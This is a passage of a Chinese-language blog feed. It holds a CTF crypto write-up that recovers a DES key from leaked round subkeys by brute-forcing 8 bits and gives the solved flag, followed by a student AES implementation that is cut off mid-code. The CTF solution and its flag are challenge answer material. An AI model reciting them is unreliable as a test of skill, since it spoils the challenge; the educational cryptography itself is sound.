&apos;0x10&apos;, &apos;0x7a&apos;, &apos;0x35&apos;, &apos;0xf1&apos;, &apos;0xe0&apos;, &apos;0x61&apos;, &apos;0xc4&apos;, &apos;0xb5&apos;, &apos;0x4b&apos;, &apos;0x31&apos;, &apos;0xa8&apos;, &apos;0xb6&apos;, &apos;0x90&apos;, &apos;0xf1&apos;, &apos;0xd2&apos;, &apos;0xda&apos;, &apos;0xe4&apos;, &apos;0x2a&apos;, &apos;0xc5&apos;, &apos;0xfe&apos;, &apos;0xfc&apos;, &apos;0x44&apos;, &apos;0xa5&apos;]</div><div class="line">#flag = mes+deskey</div></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一来就说DES，先定义了一个密钥deskey，但是没有给出内容（八个<em>号应该是八位），然后把它传进函数，ECB模式，后面给出了一个16</em>48的列表Kn,再下面给了一个密文列表cipher_list，上面有一行注释说这是把”mes”这个字符串加密得到的，最后说flag=mes + deskey。</p><p>很明显就是让我找出这两个东西，题目中给了两个列表，一个密文，那另外一个一定和密钥deskey有关，又是16*48的列表，这可能就是密钥进过圈密钥得到的密钥列表，圈密钥在前面的DES原理中有讲到，64位的密钥先置换得到56位，再分组不断移位，每次移位后再进行一次置换得到48位的密钥，我们可以通过这个过程反推回去，得到56位的密钥。选取两个Kn进行反推，为什么要选两个？因为在生成的过程中56到48有八位丢失了，选取两个移位的结果才能推出完整的56位密钥，再反推回64位密钥，这个过程需要爆破2^8。最后就得到deskey。有密钥，有密文就可以解除明文mes啦</p><h2 id="key爆破代码"><a href="#key爆破代码" class="headerlink" title="key爆破代码"></a>key爆破代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">def bin_to_str(str):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str),8):</div><div class="line">        ans += chr(int(str[i:i+8],2))</div><div class="line">    return ans</div><div class="line">k1_list = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]</div><div class="line">k2_list = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]</div><div class="line">Kn = [</div><div class="line">    [1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1],</div><div class="line">    [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1],</div><div class="line">    [1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1],</div><div class="line">    [1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0],</div><div class="line">    [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0],</div><div class="line">    [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1],</div><div class="line">    [1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0],</div><div class="line">    [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0],</div><div class="line">    [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1],</div><div class="line">    [0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0],</div><div class="line">    [0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1],</div><div class="line">    [0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0],</div><div class="line">    [1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0],</div><div class="line">    [1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0],</div><div class="line">    [1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1],</div><div class="line">    [1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0]</div><div class="line">]</div><div class="line">key_56 = []</div><div class="line">for i in range(0,2):</div><div class="line">    test_list = []</div><div class="line">    for j in range(0,56):</div><div class="line">        test_list.append(3)</div><div class="line">    key_56.append(test_list)</div><div class="line">#print key_56</div><div class="line">#print len(key_56[0])</div><div class="line">for j in range(1,3):</div><div class="line">    m = 0</div><div class="line">    for i in k2_list:</div><div class="line">        key_56[j-1][i-1] = Kn[j-1][m]</div><div class="line">        m += 1</div><div class="line">for i in range(0,56):</div><div class="line">    if key_56[0][i] == 3:</div><div class="line">        key_56[0][i] = key_56[1][i-1]</div><div class="line">#print key_56[0]</div><div class="line">k56 = []</div><div class="line">k56.append(key_56[0][55])</div><div class="line">for i in range(0,55):</div><div class="line">    k56.append(key_56[0][i])</div><div class="line">#print &quot;k56:&quot;,k56</div><div class="line">k64 = []</div><div class="line">for i in range(0,64):</div><div class="line">    k64.append(3)</div><div class="line">m = 0</div><div class="line">for i in k1_list:</div><div class="line">    k64[i-1] = k56[m]</div><div class="line">    m += 1</div><div class="line">#print k64</div><div class="line">key64_1 = &quot;0111001&quot;</div><div class="line">key64_2 = &quot;0100111&quot;</div><div class="line">key64_3 = &quot;0101111&quot;</div><div class="line">key64_4 = &quot;0110001&quot;</div><div class="line">key64_5 = &quot;0011000&quot;</div><div class="line">key64_6 = &quot;0110111&quot;</div><div class="line">key64_7 = &quot;0011000&quot;</div><div class="line">key64_8 = &quot;0111110&quot;</div><div class="line">ki = [&apos;0&apos;,&apos;1&apos;]</div><div class="line">for i1 in ki:</div><div class="line">    for i2 in ki:</div><div class="line">        for i3 in ki:</div><div class="line">            for i4 in ki:</div><div class="line">                for i5 in ki:</div><div class="line">                    for i6 in ki:</div><div class="line">                        for i7 in ki:</div><div class="line">                            for i8 in ki:</div><div class="line">                                key = key64_1 + i1 + key64_2 + i2 + key64_3 + i3 + key64_4 + i4 + key64_5 + i5 + key64_6 + i6 + key64_7 + i7 + key64_8 + i8</div><div class="line">                                str_key = bin_to_str(key)</div><div class="line">                                print str_key</div><div class="line">#key:sO_c0o1&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;前两周刚撸完DES和AES，趁热打铁做的这道题&lt;/p&gt;
&lt;h2 id=&quot;问题分析&quot;&gt;&lt;a href=&quot;#问题分析&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
    
    
      <category term="DES" scheme="http://yoursite.com/tags/DES/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计二-AES</title>
    <link href="http://yoursite.com/2018/01/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BA%8C-AES/"/>
    <id>http://yoursite.com/2018/01/01/密码学课程设计二-AES/</id>
    <published>2018-01-01T07:02:47.000Z</published>
    <updated>2018-01-03T12:05:18.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>基于CBC模式的一组明文的加密，对于文件加密的操作遇到点问题，加密之后的密文转成字符串以文本的形式输入文件会出现中文乱码，然后解密的时候只会解密出其中一部分，弄半天没有什么好的方法解决，原地爆炸（毕竟太菜），或许以后有时间会再来写吧。。。嘿嘿嘿</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="字符串异或"><a href="#字符串异或" class="headerlink" title="字符串异或"></a>字符串异或</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">def str_xor(str1,str2):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str1)):</div><div class="line">        i_ans = int(str1[i])^int(str2[i])</div><div class="line">        if i_ans == 1:</div><div class="line">            ans += &apos;1&apos;</div><div class="line">        else:</div><div class="line">            ans += &apos;0&apos;</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="字符串转字符"><a href="#字符串转字符" class="headerlink" title="字符串转字符"></a>字符串转字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def str_to_bin(str):</div><div class="line">    bins = &quot;&quot;</div><div class="line">    for i in str:</div><div class="line">        i_bin = bin(ord(i))[2:]</div><div class="line">        for j in range(0,8-len(i_bin)):</div><div class="line">            i_bin = &apos;0&apos; + i_bin</div><div class="line">        bins += i_bin</div><div class="line">    return bins</div></pre></td></tr></table></figure><h3 id="二进制转字符串"><a href="#二进制转字符串" class="headerlink" title="二进制转字符串"></a>二进制转字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def bin_to_str(str):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str),8):</div><div class="line">        ans += chr(int(str[i:i+8],2))</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="s盒"><a href="#s盒" class="headerlink" title="s盒"></a>s盒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">def s_box(str):</div><div class="line">    s_list = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,</div><div class="line">              0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,</div><div class="line">              0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,</div><div class="line">              0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,</div><div class="line">              0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,</div><div class="line">              0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,</div><div class="line">              0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,</div><div class="line">              0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,</div><div class="line">              0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,</div><div class="line">              0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,</div><div class="line">              0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,</div><div class="line">              0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,</div><div class="line">              0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,</div><div class="line">              0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,</div><div class="line">              0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,</div><div class="line">              0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str),8):</div><div class="line">        str_i = str[i:i+8]</div><div class="line">        str_h = int(str_i[:4],2)</div><div class="line">        str_l = int(str_i[4:],2)</div><div class="line">        i_ans = bin(s_list[str_h*16+str_l])[2:]</div><div class="line">        for j in range(0,8-len(i_ans)):</div><div class="line">            i_ans = &apos;0&apos; + i_ans</div><div class="line">        ans += i_ans</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="逆s盒"><a href="#逆s盒" class="headerlink" title="逆s盒"></a>逆s盒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">def re_s_box(str):</div><div class="line">    re_s_list = [0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,</div><div class="line">                 0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,</div><div class="line">                 0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,</div><div class="line">                 0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,</div><div class="line">                 0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,</div><div class="line">                 0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,</div><div class="line">                 0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,</div><div class="line">                 0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,</div><div class="line">                 0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,</div><div class="line">                 0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,</div><div class="line">                 0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,</div><div class="line">                 0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,</div><div class="line">                 0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,</div><div class="line">                 0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,</div><div class="line">                 0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,</div><div class="line">                 0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,len(str),8):</div><div class="line">        str_i = str[i:i+8]</div><div class="line">        str_h = int(str_i[:4],2)</div><div class="line">        str_l = int(str_i[4:],2)</div><div class="line">        i_ans = bin(re_s_list[str_h*16+str_l])[2:]</div><div class="line">        for j in range(0,8-len(i_ans)):</div><div class="line">            i_ans = &apos;0&apos; + i_ans</div><div class="line">        ans += i_ans</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def hmove(str):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        i_ans = str[i*32:i*32+32]</div><div class="line">        i_ans = i_ans[i*8:]+i_ans[0:i*8]</div><div class="line">        ans += i_ans</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="逆行移位"><a href="#逆行移位" class="headerlink" title="逆行移位"></a>逆行移位</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def re_hmove(str):</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        i_ans = str[i*32:i*32+32]</div><div class="line">        i_ans = i_ans[32-i*8:] + i_ans[:32-i*8]</div><div class="line">        ans += i_ans</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="GF有限域"><a href="#GF有限域" class="headerlink" title="GF有限域"></a>GF有限域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">def G1(str):</div><div class="line">    return str</div><div class="line"></div><div class="line">def G2(str):</div><div class="line">    ans = str[1:] + &apos;0&apos;</div><div class="line">    if str[0] == &apos;1&apos;:</div><div class="line">        ans = str_xor(ans,&quot;00011011&quot;)</div><div class="line">    return ans</div><div class="line"></div><div class="line">def G3(str):</div><div class="line">    ans = G2(str)</div><div class="line">    ans = str_xor(ans,str)</div><div class="line">    return ans</div><div class="line"></div><div class="line">def G4(str):</div><div class="line">    ans = G2(str)</div><div class="line">    return G2(ans)</div><div class="line"></div><div class="line">def G8(str):</div><div class="line">    ans = G4(str)</div><div class="line">    return G2(ans)</div><div class="line"></div><div class="line">def GF(str1,str2):</div><div class="line">    if str2 == &quot;01&quot;:</div><div class="line">        ans = G1(str1)</div><div class="line">    elif str2 == &quot;02&quot;:</div><div class="line">        ans = G2(str1)</div><div class="line">    elif str2 == &quot;03&quot;:</div><div class="line">        ans = G3(str1)</div><div class="line">    elif str2 == &quot;09&quot;:</div><div class="line">        ans = str_xor(G8(str1),str1)</div><div class="line">    elif str2 == &quot;0B&quot;:</div><div class="line">        ans1 = str_xor(G8(str1),G2(str1))</div><div class="line">        ans = str_xor(ans1,str1)</div><div class="line">    elif str2 == &quot;0D&quot;:</div><div class="line">        ans1 = str_xor(G8(str1),G4(str1))</div><div class="line">        ans = str_xor(ans1,str1)</div><div class="line">    else:</div><div class="line">        ans1 = str_xor(G8(str1),G4(str1))</div><div class="line">        ans = str_xor(ans1,G2(str1))</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">def list_en(str):</div><div class="line">    no_list = [&quot;02&quot;, &quot;03&quot;, &quot;01&quot;, &quot;01&quot;,</div><div class="line">               &quot;01&quot;, &quot;02&quot;, &quot;03&quot;, &quot;01&quot;,</div><div class="line">               &quot;01&quot;, &quot;01&quot;, &quot;02&quot;, &quot;03&quot;,</div><div class="line">               &quot;03&quot;, &quot;01&quot;, &quot;01&quot;, &quot;02&quot;]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        for j in range(0,4):</div><div class="line">            str_l = str[j*8:j*8+8] + str[j*8+32:j*8+40] + str[j*8+64:j*8+72] + str[j*8+96:j*8+104]</div><div class="line">            no_h = no_list[i*4] + no_list[i*4+1] + no_list[i*4+2] + no_list[i*4+3]</div><div class="line">            ans += mat_ride(str_l,no_h)</div><div class="line">    return ans</div><div class="line"></div><div class="line">def mat_ride(str1,str2):</div><div class="line">    ans = &quot;00000000&quot;</div><div class="line">    j = 0</div><div class="line">    for i in range(0,len(str2),2):</div><div class="line">        str3 = str1[j*8:j*8+8]</div><div class="line">        sum_ans = GF(str3,str2[i:i+2])</div><div class="line">        ans = str_xor(ans,sum_ans)</div><div class="line">        j += 1</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="逆列混淆"><a href="#逆列混淆" class="headerlink" title="逆列混淆"></a>逆列混淆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">def re_list_en(str):</div><div class="line">    re_list = [&quot;0E&quot;,&quot;0B&quot;,&quot;0D&quot;,&quot;09&quot;,</div><div class="line">               &quot;09&quot;,&quot;0E&quot;,&quot;0B&quot;,&quot;0D&quot;,</div><div class="line">               &quot;0D&quot;,&quot;09&quot;,&quot;0E&quot;,&quot;0B&quot;,</div><div class="line">               &quot;0B&quot;,&quot;0D&quot;,&quot;09&quot;,&quot;0E&quot;]</div><div class="line">    ans = &quot;&quot;</div><div class="line">    for i in range(0,4):</div><div class="line">        for j in range(0,4):</div><div class="line">            str_l = str[j*8:j*8+8] + str[j*8+32:j*8+40] + str[j*8+64:j*8+72] + str[j*8+96:j*8+104]</div><div class="line">            re_h = re_list[i*4] + re_list[i*4+1] + re_list[i*4+2] + re_list[i*4+3]</div><div class="line">            ans += re_mat_ride(str_l,re_h)</div><div class="line">    return ans</div><div class="line"></div><div class="line">def re_mat_ride(str1,str2):</div><div class="line">    ans = &quot;00000000&quot;</div><div class="line">    j = 0</div><div class="line">    for i in range(0,len(str2),2):</div><div class="line">        str3 = str1[j*8:j*8+8]</div><div class="line">        sum_ans = GF(str3,str2[i:i+2])</div><div class="line">        ans = str_xor(ans,sum_ans)</div><div class="line">        j += 1</div><div class="line">    return ans</div></pre></td></tr></table></figure><h3 id="密钥拓展"><a href="#密钥拓展" class="headerlink" title="密钥拓展"></a>密钥拓展</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def key_Expand(str):</div><div class="line">    k_list = []</div><div class="line">    for i in 